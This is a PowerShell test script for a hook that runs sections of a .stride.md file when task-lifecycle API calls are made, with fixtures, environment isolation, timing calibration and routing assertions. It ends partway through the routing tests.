# test-stride-hook.ps1 — Tests for stride-hook.ps1 PowerShell hook script
#
# Mirrors all 6 test groups from test-stride-hook.sh.
# Self-contained — no Pester or external dependencies.
#
# Usage: pwsh test-stride-hook.ps1

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# (D235) HERMETICITY GATE — mirrors the bash suite's gate.
#
# NAMES ARE REPORTED, VALUES ARE NOT. An earlier version printed `NAME=VALUE`,
# which would echo a developer's secrets to stdout and into any captured CI log.
#
# The list is DERIVED from stride-hook.ps1 rather than copied from the bash
# gate — the two hooks do not read the same set, and a copied list would be
# authoritative-looking and wrong. It must be derived from BOTH accessors: an
# earlier version searched only `$env:NAME` and so missed TASK_BASE_REF and
# HOOK_NAME, which that hook reads through
# [System.Environment]::GetEnvironmentVariable(...,'Process') — its dominant
# form. TASK_BASE_REF in particular selects the git range the diff walks, so an
# ambient one silently changes what a snapshot captures.
#
# RESTORES RATHER THAN DESTROYS. Remove-Item Env: is process-scoped, and a .ps1
# run from an interactive prompt runs IN that session — clearing outright would
# delete variables from the developer's shell for the rest of the session.
# That is the precise hazard this mirror was written to fix, so it snapshots
# first and restores in a try/finally wrapped around the suite body.
#
# Set STRIDE_TEST_KEEP_ENV=1 to run against your own environment instead; the
# results are then not hermetic and the gate says so.
$script:StrideHookEnvVars = @(
    'CLAUDE_PROJECT_DIR'      # $env:
    'GOAL_ID'                 # $env:
    'GOAL_IDENTIFIER'         # $env:
    'HOOK_NAME'               # GetEnvironmentVariable, stride-hook.ps1
    'STRIDE_HOOK_TIMEOUT_OVERRIDE'  # GetEnvironmentVariable
    'TASK_BASE_REF'           # GetEnvironmentVariable — selects the diff range
    'TASK_ID'                 # both forms
)

function Get-StrideInheritedHookVars {
    $names = @()
    foreach ($name in $script:StrideHookEnvVars) {
        if ($null -ne (Get-Item -Path "Env:$name" -ErrorAction SilentlyContinue)) { $names += $name }
    }
    # TASK_BASE_REF_<id> is an open-ended family keyed by task id (D226), so a
    # fixed list structurally cannot cover it — sweep the prefix instead.
    foreach ($item in Get-ChildItem -Path Env: -ErrorAction SilentlyContinue) {
        if ($item.Name -like 'TASK_BASE_REF_*') { $names += $item.Name }
    }
    $names | Sort-Object -Unique
}

$script:StrideSavedEnv = @{}
# @() forces an array: Sort-Object returns a scalar for a single element, and
# Set-StrictMode -Version Latest makes .Count on a scalar a hard error.
$inheritedNames = @(Get-StrideInheritedHookVars)

if ($inheritedNames.Count -gt 0) {
    if ($env:STRIDE_TEST_KEEP_ENV -eq '1') {
        Write-Host 'WARNING: STRIDE_TEST_KEEP_ENV=1 - running against your environment.'
        Write-Host 'These hook-read variables are INHERITED and may change what the assertions measure:'
        $inheritedNames | ForEach-Object { Write-Host "  $_" }
        Write-Host 'Results are NOT hermetic. Unset STRIDE_TEST_KEEP_ENV to neutralise them.'
        # NARROWER THAN IT USED TO BE, and saying so beats letting the list
        # above overstate its own reach: the TASK_ID/TASK_IDENTIFIER and
        # record-family names are stripped from every hook CHILD regardless of
        # this setting (see $script:StrideChildEnvStrip), so for child-process
        # cases they cannot reach the code under test either way. This mode now
        # affects only the in-process cases - Groups 22, 24 and 25, which
        # dot-source hook functions into THIS process - and the non-TASK_ names
        # such as CLAUDE_PROJECT_DIR, HOOK_NAME and GOAL_*.
        Write-Host 'NOTE: TASK_ID/TASK_IDENTIFIER and the five record families are stripped from'
        Write-Host 'hook children regardless of this setting; KEEP_ENV affects only the in-process'
        Write-Host 'cases and the non-TASK_ variables.'
    } else {
        Write-Host 'NOTE: neutralising inherited hook variables so the suite asserts the'
        Write-Host 'behaviour under test rather than your environment (D235):'
        $inheritedNames | ForEach-Object { Write-Host "  $_" }
        Write-Host 'Set STRIDE_TEST_KEEP_ENV=1 to keep them instead.'
        foreach ($name in $inheritedNames) {
            $script:StrideSavedEnv[$name] = (Get-Item -Path "Env:$name").Value
            Remove-Item -Path "Env:$name" -ErrorAction SilentlyContinue
        }
        # Restored by the finally block at the end of this file. An earlier
        # version registered a PowerShell.Exiting handler instead; that fires on
        # ENGINE exit, not when a script returns, so in the very case the
        # comment above describes — a .ps1 run from an interactive prompt — the
        # developer's variables stayed cleared. The handler could not read
        # $script:StrideSavedEnv from its own scope either.
    }
    Write-Host ''
}

# try/finally so the restore runs when this SCRIPT ends (see the gate above).
try {

$script:PASS = 0
$script:FAIL = 0
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$HookScript = Join-Path $ScriptDir 'stride-hook.ps1'

# --- Assertion helpers ---

function Assert-Eq {
    param([string]$Label, [string]$Expected, [string]$Actual)
    if ($Expected -eq $Actual) {
        Write-Host "  PASS: $Label" -ForegroundColor Green
        $script:PASS++
    } else {
        Write-Host "  FAIL: $Label" -ForegroundColor Red
        Write-Host "    expected: $($Expected.Substring(0, [Math]::Min(200, $Expected.Length)))"
        Write-Host "    actual:   $($Actual.Substring(0, [Math]::Min(200, $Actual.Length)))"
        $script:FAIL++
    }
}

function Assert-Contains {
    param([string]$Label, [string]$Needle, [string]$Haystack)
    if ($Haystack.Contains($Needle)) {
        Write-Host "  PASS: $Label" -ForegroundColor Green
        $script:PASS++
    } else {
        Write-Host "  FAIL: $Label" -ForegroundColor Red
        Write-Host "    expected to contain: $Needle"
        Write-Host "    actual: $($Haystack.Substring(0, [Math]::Min(200, $Haystack.Length)))"
        $script:FAIL++
    }
}

function Assert-NotContains {
    param([string]$Label, [string]$Needle, [string]$Haystack)
    if (-not $Haystack.Contains($Needle)) {
        Write-Host "  PASS: $Label" -ForegroundColor Green
        $script:PASS++
    } else {
        Write-Host "  FAIL: $Label" -ForegroundColor Red
        Write-Host "    expected NOT to contain: $Needle"
        $script:FAIL++
    }
}

function Assert-Exit {
    param([string]$Label, [int]$Expected, [int]$Actual)
    if ($Expected -eq $Actual) {
        Write-Host "  PASS: $Label (exit $Actual)" -ForegroundColor Green
        $script:PASS++
    } else {
        Write-Host "  FAIL: $Label" -ForegroundColor Red
        Write-Host "    expected exit: $Expected"
        Write-Host "    actual exit:   $Actual"
        $script:FAIL++
    }
}

# --- Helper: run stride-hook.ps1 with input and capture output ---
# THE CHILD DOES NOT INHERIT THIS PROCESS'S TASK STATE unless a case asks for
# it. Every variable of the TEST process used to be copied into the hook child,
# and Group 22's unit cases set TASK_BASE_REF_42='abc123' and TASK_BASE_REF_77
# in this process and never clear them. Get-TaskBaseRefFor reads the ENVIRONMENT
# rather than the cache, so any later case that drives a real hook and expects a
# base to be ABSENT was reading a pollutant instead - and 22s's first draft
# passed under the very tail-cap mutation it exists to catch, because the
# inherited 'abc123' stopped the refusal firing, failed to resolve, and fell
# back to HEAD~1 to produce a plausible snapshot.
#
# Stripped as a CLASS rather than per case: a per-case clear only removes the
# instance someone already noticed, and this one went unnoticed until a mutation
# run disagreed with a hand-built repro. Audited at the time of writing, only
# 22s was actually weakened - but "only one case is wrong today" is not a
# property that survives the next case anyone adds. -InheritTaskEnv is the
# opt-out for a case that genuinely means to pass task state through the
# environment; no case needs it today.
# MATCHED CASE-INSENSITIVELY, on the rule the production loader states for this
# exact key namespace (stride-hook.ps1:2046): case-sensitivity is safe on an
# ALLOW-list, because it can only admit less; on a GATE it admits less GATING,
# which is the opposite. Windows environment variables are case-insensitive and
# Windows is the shipping host, so a variable stored as Task_Base_Ref_42 IS
# TASK_BASE_REF_42 to the child - and a case-sensitive strip would let it
# through, reopening the very class this guard closes. The rule is FOLLOWED
# rather than tested: macOS env names really are case-sensitive, so a mixed-case
# leg in 9k2 would prove nothing on the host this suite is developed on. The
# pattern is fully anchored over seven specific names, so insensitivity costs no
# false positives.
# --gate-probe (W2105): report what the gate did, then exit. Group 27 runs THIS
# script as a child with variables deliberately set, and reads these lines back.
# The gate has to be observable from outside to be testable at all: the bash
# twin does the same, and its group exists because the gate was the one thing in
# that file nothing asserted. Hand-verification does not survive a refactor.
#
# AFTER the gate, so the lines report the POST-gate state - which is what
# distinguishes "reported it" from "actually cleared it", the distinction 27c
# turns on.
if ($args -contains '--gate-probe') {
    foreach ($n in @($script:StrideHookEnvVars + @('TASK_BASE_REF_99'))) {
        $v = [System.Environment]::GetEnvironmentVariable($n, 'Process')
        if ($null -eq $v) { $v = '<unset>' }
        Write-Host "AFTER_GATE:${n}=$v"
    }
    exit 0
}

$script:StrideChildEnvStrip = '^(TASK_(ID|IDENTIFIER|BASE_REF|HEAD_REF|OWNED|NARROWED|BASE_AT)(_[A-Za-z0-9_]+)?)\z'

function Invoke-HookScript {
    param(
        [string]$InputJson,
        [string]$Phase,
        [string]$ProjectDir,
        [switch]$InheritTaskEnv
    )
    $tempInput = [System.IO.Path]::GetTempFileName()
    $tempOutput = [System.IO.Path]::GetTempFileName()
    $tempError = [System.IO.Path]::GetTempFileName()
    try {
        Set-Content -Path $tempInput -Value $InputJson -Encoding UTF8 -NoNewline
        $envArgs = @{}
        if ($ProjectDir) {
            $envArgs['CLAUDE_PROJECT_DIR'] = $ProjectDir
        }
        # Build environment block
        $envBlock = [System.Collections.Generic.Dictionary[string,string]]::new()
        foreach ($key in [System.Environment]::GetEnvironmentVariables('Process').Keys) {
            $envBlock[$key] = [System.Environment]::GetEnvironmentVariable($key, 'Process')
        }
        if ($ProjectDir) {
            $envBlock['CLAUDE_PROJECT_DIR'] = $ProjectDir
        }

        $psi = [System.Diagnostics.ProcessStartInfo]::new()
        $psi.FileName = 'pwsh'
        $psi.Arguments = "-NoProfile -File `"$HookScript`" $Phase"
        $psi.RedirectStandardInput = $true
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        foreach ($kv in $envBlock.GetEnumerator()) {
            $psi.Environment[$kv.Key] = $kv.Value
        }
        # REMOVED FROM $psi.Environment, not merely omitted from what is added
        # to it. ProcessStartInfo.Environment comes PRE-SEEDED with this
        # process's variables, so filtering the block above strips nothing - the
        # first version of this guard did exactly that and 9k2 failed on the
        # first run, which is the whole reason 9k2 exists rather than being
        # taken on trust.
        if (-not $InheritTaskEnv) {
            foreach ($key in @($psi.Environment.Keys)) {
                if ("$key" -match $script:StrideChildEnvStrip) { $null = $psi.Environment.Remove($key) }
            }
        }
        if ($ProjectDir) {
            $psi.Environment['CLAUDE_PROJECT_DIR'] = $ProjectDir
        }

        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.StandardInput.Write($InputJson)
        $proc.StandardInput.Close()
        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()
        $proc.WaitForExit()

        return @{
            ExitCode = $proc.ExitCode
            Stdout   = $stdout
            Stderr   = $stderr
        }
    } finally {
        Remove-Item -Force $tempInput, $tempOutput, $tempError -ErrorAction SilentlyContinue
    }
}

# --- Helper: wait for a listener job to accept connections ---
# Start-Job spawns a whole pwsh process, so the HttpListener inside it can
# take longer to come up than the hook subprocess takes to fire its PUT.
# Poll the port until it accepts a TCP connection (or the timeout elapses)
# before invoking the hook, otherwise the PUT races the listener startup.
function Wait-ForListener {
    param([int]$Port, [int]$TimeoutSeconds = 10)
    $deadline = [DateTime]::UtcNow.AddSeconds($TimeoutSeconds)
    while ([DateTime]::UtcNow -lt $deadline) {
        $client = [System.Net.Sockets.TcpClient]::new()
        try {
            $client.Connect('localhost', $Port)
            if ($client.Connected) { return $true }
        } catch {
            Start-Sleep -Milliseconds 100
        } finally {
            $client.Dispose()
        }
    }
    return $false
}

# ============================================================
# Setup: create temp directory with test fixtures
# ============================================================
$TmpDir = Join-Path ([System.IO.Path]::GetTempPath()) "stride-ps-test-$([System.Guid]::NewGuid().ToString('N').Substring(0,8))"
New-Item -ItemType Directory -Path $TmpDir -Force | Out-Null

# ============================================================
# Load calibration and wall-clock reporting (D241)
# ============================================================
# Mirror of the bash suite's calibration, and this side is where the defect was
# actually OBSERVED: test 11d reported "expected kill near 4s, took 21s" while a
# second test suite ran concurrently, then passed on a quiet re-run. The fixed
# bounds below (`-lt 20`, `-lt 15`) have to absorb process-startup overhead,
# which scales with machine load — and pwsh startup is heavier than bash's, so
# this mirror is MORE exposed to it, not less.
#
# Two distinct fixes, as in the bash twin:
#   - wall-clock bounds are scaled by measured load and then CLAMPED below the
#     un-killed duration, so they keep catching a timeout that never fires;
#   - the timeout tests' own budget is scaled, so command 1 of the section still
#     finishes inside it under load and the kill lands where the case asserts.
$script:SuiteLoadBaselineMs = 1000  # idle measures ~682ms; 1000 leaves room for jitter
$script:SuiteWallBaselineS  = 300   # measured: ~298s for the whole suite, idle

function Get-SuiteNowMs { [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() }

# Best of three: we want the machine's floor for one no-op invocation, so a
# single scheduling hiccup during calibration cannot inflate every bound.
function Measure-SuiteOverheadMs {
    $p = Join-Path $TmpDir '.load-calibration'
    New-Item -ItemType Directory -Path $p -Force | Out-Null
    Set-Content -Path (Join-Path $p '.stride.md') -Value @'
## before_doing
```bash
true
```
'@ -Encoding UTF8
    $claim = '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim -d {}"}}'
    $best = [int]::MaxValue
    foreach ($i in 1..3) {
        $s = Get-SuiteNowMs
        $null = Invoke-HookScript -InputJson $claim -Phase 'post' -ProjectDir $p
        $e = [int]([long](Get-SuiteNowMs) - [long]$s)
        if ($e -lt $best) { $best = $e }
    }
    return $best
}

$script:SuiteStartMs = Get-SuiteNowMs
# Guarded because this runs BEFORE the try/finally that removes $TmpDir: a throw
# in calibration would otherwise leak the temp directory and its fixtures. The
# bash twin needs no equivalent — its `trap ... EXIT` is armed before calibration.
try {
    $script:SuiteOverheadMs = Measure-SuiteOverheadMs
} catch {
    Remove-Item -Recurse -Force $TmpDir -ErrorAction SilentlyContinue
    throw
}
$script:SuiteLoadScale = [Math]::Max(1, [Math]::Ceiling($script:SuiteOverheadMs / [double]$script:SuiteLoadBaselineMs))

# $Base holds on an idle machine; $UnkilledSec is how long the hook body runs if
# the kill never fires. The clamp is the load-bearing half — an 8x scale would
# take 11a's bound from 20s to 160s, and a `sleep 30` that ran in full would sail
# straight through it.
function Get-WallBudget {
    param([int]$Base, [int]$UnkilledSec)
    $scaled = $Base * $script:SuiteLoadScale
    $cap = $UnkilledSec - 3
    # A cap already below the base means the case is mis-specified: its un-killed
    # duration does not leave room for the bound it asks for. Say so, and return
    # the tighter cap — silently restoring the base would reinstate exactly the
    # un-clamped value this function exists to prevent.
    if ($cap -lt $Base) {
        Write-Host "  Get-WallBudget: base ${Base}s does not fit under un-killed ${UnkilledSec}s" -ForegroundColor Red
        return $cap
    }
    if ($scaled -gt $cap) { $scaled = $cap }
    return $scaled
}

# The timeout cases run `echo` / `sleep 30` under a 1s budget and assert the kill
# landed on the SECOND command. That holds only while command 1 — a fork — fits
# inside the budget, which is exactly what load inflates. At scale 1 this is 1s,
# unchanged.
$script:TimeoutTestBudget = [Math]::Min(2 * $script:SuiteLoadScale, 8)

# 11d's section budget. CAPPED for the same reason as the bash twin: the section
# is `sleep 2; sleep 30` = ~32s, so an unclamped 4x8=32s budget would expire only
# as the section finished on its own and the kill might never fire.
$script:SpanTestBudget = [Math]::Min(4 * $script:SuiteLoadScale, 8)

if ($script:SuiteLoadScale -gt 1) {
    Write-Host "NOTE: this machine is loaded — a trivial hook invocation took $($script:SuiteOverheadMs)ms"
    Write-Host "      against a $($script:SuiteLoadBaselineMs)ms idle baseline, so wall-clock backstops are"
    Write-Host "      scaled $($script:SuiteLoadScale)x. Timing results are not comparable to an idle run."
    Write-Host ""
}

try {

# --- Test .stride.md files ---

Set-Content -Path (Join-Path $TmpDir 'basic.stride.md') -Value @'
## before_doing
```bash
echo "pulling latest"
echo "getting deps"
```

## after_doing
```bash
echo "running tests"
echo "running credo"
```

## before_review
```bash
echo "creating pr"
```

## after_review
```bash
echo "deploying"
```
'@ -Encoding UTF8

Set-Content -Path (Join-Path $TmpDir 'with-comments.stride.md') -Value @'
## before_doing
```bash
# This is a comment
echo "step one"
   echo "indented step"
echo "step three"
# Another comment
```
'@ -Encoding UTF8

Set-Content -Path (Join-Path $TmpDir 'no-hook.stride.md') -Value @'
## before_doing
```bash
echo "only before_doing here"
```
'@ -Encoding UTF8

Set-Content -Path (Join-Path $TmpDir 'empty-block.stride.md') -Value @'
## after_doing
```bash
```
'@ -Encoding UTF8

Set-Content -Path (Join-Path $TmpDir 'multiple-code-blocks.stride.md') -Value @'
## before_doing

Some documentation text here.

```bash
echo "first command"
echo "second command"
```

More text and another block that should be ignored:

```bash
echo "should not appear"
```
'@ -Encoding UTF8

Set-Content -Path (Join-Path $TmpDir 'no-bash-block.stride.md') -Value @'
## before_doing

Just some text, no code block.

## after_doing
```bash
echo "after_doing works"
```
'@ -Encoding UTF8

Set-Content -Path (Join-Path $TmpDir 'adjacent-sections.stride.md') -Value @'
## before_doing
```bash
echo "before"
```
## after_doing
```bash
echo "after"
```
'@ -Encoding UTF8

# ============================================================
# Test Group 1: JSON command extraction
# ============================================================
Write-Host ""
Write-Host "=== Test Group 1: JSON command extraction ==="

# We test extraction by providing JSON and checking if the script
# routes correctly (which proves the command was extracted).
# For isolated extraction tests, we check that non-Stride commands
# produce no output and exit 0.

$proj = Join-Path $TmpDir 'g1-project'
New-Item -ItemType Directory -Path $proj -Force | Out-Null
Copy-Item (Join-Path $TmpDir 'basic.stride.md') (Join-Path $proj '.stride.md')

# 1a: Standard claim command extracts correctly
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim"}}' -Phase 'post' -ProjectDir $proj
Assert-Exit "standard claim URL exits 0" 0 $r.ExitCode
# D65: passing-command output is folded into the success JSON on stdout, not
# written to stderr (which Claude Code mislabels as a hook error).
Assert-Contains "claim runs before_doing" "pulling latest" $r.Stdout

# 1b: Complete command extracts correctly
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X PATCH https://stridelikeaboss.com/api/tasks/123/complete"}}' -Phase 'pre' -ProjectDir $proj
Assert-Exit "complete URL exits 0" 0 $r.ExitCode
Assert-Contains "pre-complete runs after_doing" "running tests" $r.Stdout

# 1c: No command key present
$r = Invoke-HookScript -InputJson '{"tool_input":{"other_key":"some value"}}' -Phase 'post' -ProjectDir $proj
Assert-Exit "no command key exits 0" 0 $r.ExitCode

# 1d: Empty command value
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":""}}' -Phase 'post' -ProjectDir $proj
Assert-Exit "empty command exits 0" 0 $r.ExitCode

# 1e: Completely unrelated JSON
$r = Invoke-HookScript -InputJson '{"foo":"bar","baz":42}' -Phase 'post' -ProjectDir $proj
Assert-Exit "unrelated JSON exits 0" 0 $r.ExitCode

# ============================================================
# Test Group 2: .stride.md section parser
# ============================================================
Write-Host ""
Write-Host "=== Test Group 2: .stride.md section parser ==="

$proj2 = Join-Path $TmpDir 'g2-project'
New-Item -ItemType Directory -Path $proj2 -Force | Out-Null

$ClaimJson = '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim"}}'
$CompleteJson = '{"tool_input":{"command":"curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete"}}'
$ReviewJson = '{"tool_input":{"command":"curl -X PATCH https://stridelikeaboss.com/api/tasks/99/mark_reviewed"}}'

# 2a-d: Parse all 4 sections from basic file
Copy-Item (Join-Path $TmpDir 'basic.stride.md') (Join-Path $proj2 '.stride.md') -Force
$r = Invoke-HookScript -InputJson $ClaimJson -Phase 'post' -ProjectDir $proj2
Assert-Contains "basic: before_doing line 1" 'pulling latest' $r.Stdout
Assert-Contains "basic: before_doing line 2" 'getting deps' $r.Stdout

$r = Invoke-HookScript -InputJson $CompleteJson -Phase 'pre' -ProjectDir $proj2
Assert-Contains "basic: after_doing line 1" 'running tests' $r.Stdout
Assert-Contains "basic: after_doing line 2" 'running credo' $r.Stdout

$r = Invoke-HookScript -InputJson $CompleteJson -Phase 'post' -ProjectDir $proj2
Assert-Contains "basic: before_review" 'creating pr' $r.Stdout

$r = Invoke-HookScript -InputJson $ReviewJson -Phase 'post' -ProjectDir $proj2
Assert-Contains "basic: after_review" 'deploying' $r.Stdout

# 2e: Sections don't bleed
$r = Invoke-HookScript -InputJson $ClaimJson -Phase 'post' -ProjectDir $proj2
Assert-NotContains "sections do not bleed" 'running tests' $r.Stdout

# 2f: Hook not present in file
Copy-Item (Join-Path $TmpDir 'no-hook.stride.md') (Join-Path $proj2 '.stride.md') -Force
$r = Invoke-HookScript -InputJson $CompleteJson -Phase 'pre' -ProjectDir $proj2
Assert-Exit "missing hook exits 0" 0 $r.ExitCode

# 2g: Empty code block
Copy-Item (Join-Path $TmpDir 'empty-block.stride.md') (Join-Path $proj2 '.stride.md') -Force
$r = Invoke-HookScript -InputJson $CompleteJson -Phase 'pre' -ProjectDir $proj2
Assert-Exit "empty code block exits 0" 0 $r.ExitCode

# 2h: Only first code block captured
Copy-Item (Join-Path $TmpDir 'multiple-code-blocks.stride.md') (Join-Path $proj2 '.stride.md') -Force
$r = Invoke-HookScript -InputJson $ClaimJson -Phase 'post' -ProjectDir $proj2
Assert-Contains "first block captured" 'first command' $r.Stdout
Assert-NotContains "second block ignored" 'should not appear' $r.Stdout

# 2i: Section with no bash block
Copy-Item (Join-Path $TmpDir 'no-bash-block.stride.md') (Join-Path $proj2 '.stride.md') -Force
$r = Invoke-HookScript -InputJson $ClaimJson -Phase 'post' -ProjectDir $proj2
Assert-Exit "no bash block exits 0" 0 $r.ExitCode

# 2j: Adjacent sections
Copy-Item (Join-Path $TmpDir 'adjacent-sections.stride.md') (Join-Path $proj2 '.stride.md') -Force
# Command output (not the command text) is the observable here. Post-D65 the
# executed-command stdout is folded into the structured success JSON on stdout
# (the literal `echo "before"` with quotes never appears because the output of
# the echo — `before` — is what is captured, not the command text).
$r = Invoke-HookScript -InputJson $ClaimJson -Phase 'post' -ProjectDir $proj2
Assert-Contains "adjacent: before_doing correct" 'before' $r.Stdout
Assert-NotContains "adjacent sections do not bleed" 'after' $r.Stdout

$r = Invoke-HookScript -InputJson $CompleteJson -Phase 'pre' -ProjectDir $proj2
Assert-Contains "adjacent: after_doing correct" 'after' $r.Stdout

# ============================================================
# Test Group 3: Whitespace trimming
# ============================================================
Write-Host ""
Write-Host "=== Test Group 3: Whitespace trimming ==="

# Test the TrimStart behavior used in command list building.
# NOTE: the parameter must not be named $Input — that is a reserved
# PowerShell automatic variable (the pipeline enumerator) and binding a
# param to it silently yields an empty value.
function Test-TrimStart {
    param([string]$Value)
    return $Value.TrimStart()
}

Assert-Eq "trim leading spaces" "echo hello" (Test-TrimStart "   echo hello")
Assert-Eq "trim leading tabs" "echo hello" (Test-TrimStart "`t`techo hello")
Assert-Eq "trim mixed whitespace" "echo hello" (Test-TrimStart "`t  `techo hello")
Assert-Eq "no trim needed" "echo hello" (Test-TrimStart "echo hello")
Assert-Eq "all whitespace becomes empty" "" (Test-TrimStart "   ")
Assert-Eq "empty string stays empty" "" (Test-TrimStart "")

# ============================================================
# Test Group 4: Command list building
# ============================================================
Write-Host ""
Write-Host "=== Test Group 4: Command list building ==="

# Test the filtering logic: skip comments and blank lines
function Build-CmdList {
    param([string]$Commands)
    $result = @()
    foreach ($cmd in ($Commands -split "`n")) {
        $trimmed = $cmd.TrimStart()
        if (-not $trimmed) { continue }
        if ($trimmed.StartsWith('#')) { continue }
        $result += $trimmed
    }
    return $result
}

$commands = "# comment`necho `"step one`"`n   echo `"indented step`"`n`necho `"step three`"`n# trailing comment"
$result = Build-CmdList $commands
Assert-Eq "filtered to 3 commands" "3" "$($result.Count)"
Assert-Eq "keeps step one" 'echo "step one"' $result[0]
Assert-Eq "trims indented step" 'echo "indented step"' $result[1]
Assert-Eq "keeps step three" 'echo "step three"' $result[2]

$commands = "# only comments`n`n# more comments`n"
# @() re-wraps the result: a function returning an empty array unrolls to
# $null on the pipeline, and $null.Count is a hard error under
# Set-StrictMode -Version Latest on pwsh 7.6+.
$result = @(Build-CmdList $commands)
Assert-Eq "all comments filtered to empty" "0" "$($result.Count)"

# ============================================================
# Test Group 5: Full integration
# ============================================================
Write-Host ""
Write-Host "=== Test Group 5: Full integration ==="

$proj5 = Join-Path $TmpDir 'g5-project'
New-Item -ItemType Directory -Path $proj5 -Force | Out-Null
Set-Content -Path (Join-Path $proj5 '.stride.md') -Value @'
## before_doing
```bash
echo "before_doing_executed"
```

## after_doing
```bash
echo "after_doing_executed"
```

## before_review
```bash
echo "before_review_executed"
```

## after_review
```bash
echo "after_review_executed"
```
'@ -Encoding UTF8

# 5a: Claim triggers before_doing
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim -d {}"}}' -Phase 'post' -ProjectDir $proj5
Assert-Exit "claim exits 0" 0 $r.ExitCode
Assert-Contains "claim runs before_doing" "before_doing_executed" $r.Stdout
# D65: a fully passing section writes nothing to stderr.
Assert-Eq "claim writes nothing to stderr" "" $r.Stderr.Trim()

# 5b: Pre-complete triggers after_doing
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete"}}' -Phase 'pre' -ProjectDir $proj5
Assert-Exit "pre-complete exits 0" 0 $r.ExitCode
Assert-Contains "pre-complete runs after_doing" "after_doing_executed" $r.Stdout

# 5c: Post-complete triggers before_review
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete"}}' -Phase 'post' -ProjectDir $proj5
Assert-Exit "post-complete exits 0" 0 $r.ExitCode
Assert-Contains "post-complete runs before_review" "before_review_executed" $r.Stdout

# 5d: Mark-reviewed triggers after_review
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X PATCH https://stridelikeaboss.com/api/tasks/99/mark_reviewed"}}' -Phase 'post' -ProjectDir $proj5
Assert-Exit "mark-reviewed exits 0" 0 $r.ExitCode
Assert-Contains "mark-reviewed runs after_review" "after_review_executed" $r.Stdout

# 5e: Non-stride command exits cleanly
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"ls -la"}}' -Phase 'post' -ProjectDir $proj5
Assert-Exit "non-stride exits 0" 0 $r.ExitCode
Assert-Eq "non-stride no stderr" "" $r.Stderr.Trim()

# 5f: No .stride.md exits cleanly
$emptyProj = Join-Path $TmpDir 'empty-project'
New-Item -ItemType Directory -Path $emptyProj -Force | Out-Null
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim"}}' -Phase 'post' -ProjectDir $emptyProj
Assert-Exit "no .stride.md exits 0" 0 $r.ExitCode

# 5g: No phase argument exits cleanly
$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim"}}' -Phase '' -ProjectDir $proj5
Assert-Exit "no phase exits 0" 0 $r.ExitCode

# 5h: Hook with failing command exits 2
$failProj = Join-Path $TmpDir 'fail-project'
New-Item -ItemType Directory -Path $failProj -Force | Out-Null
Set-Content -Path (Join-Path $failProj '.stride.md') -Value @'
## before_doing
```bash
echo "step one passes"
false
echo "step three should not run"
```
'@ -Encoding UTF8

$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim"}}' -Phase 'post' -ProjectDir $failProj
Assert-Exit "failing hook exits 2" 2 $r.ExitCode
# The failure message stays on stderr — load-bearing for the PreToolUse
# blocking semantic (exit 2 + stderr message).
Assert-Contains "failing hook reports failure on stderr" "hook failed on command 2/3" $r.Stderr
# D65: the earlier PASSING command's output must NOT leak to stderr.
Assert-NotContains "passing command output kept off stderr" "step one passes" $r.Stderr
Assert-NotContains "stops execution after failure" "step three should not run" $r.Stderr

# 5i: Hook with multiple successful commands
$multiProj = Join-Path $TmpDir 'multi-project'
New-Item -ItemType Directory -Path $multiProj -Force | Out-Null
Set-Content -Path (Join-Path $multiProj '.stride.md') -Value @'
## after_doing
```bash
echo "test_one"
echo "test_two"
echo "test_three"
```
'@ -Encoding UTF8

$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete"}}' -Phase 'pre' -ProjectDir $multiProj
Assert-Exit "multi-command exits 0" 0 $r.ExitCode
# D65: each passing command's output is folded into commands_output on stdout.
Assert-Contains "multi-command: emits commands_output" '"commands_output"' $r.Stdout
Assert-Contains "multi-command: step 1" "test_one" $r.Stdout
Assert-Contains "multi-command: step 2" "test_two" $r.Stdout
Assert-Contains "multi-command: step 3" "test_three" $r.Stdout

# 5j: Missing section exits 0
$partialProj = Join-Path $TmpDir 'partial-project'
New-Item -ItemType Directory -Path $partialProj -Force | Out-Null
Set-Content -Path (Join-Path $partialProj '.stride.md') -Value @'
## before_doing
```bash
echo "only before_doing"
```
'@ -Encoding UTF8

$r = Invoke-HookScript -InputJson '{"tool_input":{"command":"curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete"}}' -Phase 'pre' -ProjectDir $partialProj
Assert-Exit "missing section exits 0" 0 $r.ExitCode

# ------------------------------------------------------------
# 5m-5ad (D220): routing depends on the request being ISSUED, not on the
# command text CONTAINING a lifecycle URL. Mirrors the bash suite's 5m-5ad —
# keep the two in lockstep, since a divergence here means Windows agents route
# differently from everyone else.
# ------------------------------------------------------------

# Negative helper: neither phase may run any section for this command.
function Assert-NoRoute {
    param([string]$Label, [string]$Fixture)
    foreach ($phase in @('post', 'pre')) {
        $res = Invoke-HookScript -InputJson $Fixture -Phase $phase -ProjectDir $proj5
        Assert-Exit "$Label ($phase) exits 0" 0 $res.ExitCode
        Assert-Eq "$Label ($phase) runs no section" "" $res.Stdout.Trim()
    }
}

